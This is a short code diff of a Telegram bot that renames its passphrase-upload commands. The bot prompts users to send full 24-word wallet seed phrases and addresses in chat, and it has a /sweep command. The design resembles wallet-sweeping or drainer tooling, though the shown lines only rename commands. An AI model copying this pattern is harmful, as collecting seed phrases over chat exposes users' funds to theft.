@@ -44,13 +44,13 @@ bot.onText(/\/sweep/, (msg) => {
     userSessions[chatId] = { waitingForPassphraseForSweeping: true, stopAll: false }
 });
 
-bot.onText(/\/upload_passphrase/, (msg) => {
+bot.onText(/\/uploadPassphrase/, (msg) => {
     const chatId = msg.chat.id;
     bot.sendMessage(chatId, '📥 Please send your 24-word passphrase followed by the wallet address.\n\nFormat:\n`word1 word2 ... word24 G...`', { parse_mode: 'Markdown' });
     userSessions[chatId] = { waitingForPassphraseAndAddress: true };
 });
 
-bot.onText(/\/upload_sponsor/, (msg) => {
+bot.onText(/\/uploadSponsor/, (msg) => {
     const chatId = msg.chat.id;
     bot.sendMessage(chatId, '📥 Please send your 24-word passphrase followed by label.\n\nFormat:\n`word1 word2 ... word24 name`', { parse_mode: 'Markdown' });
     userSessions[chatId] = { waitingForPassphraseAndName: true };
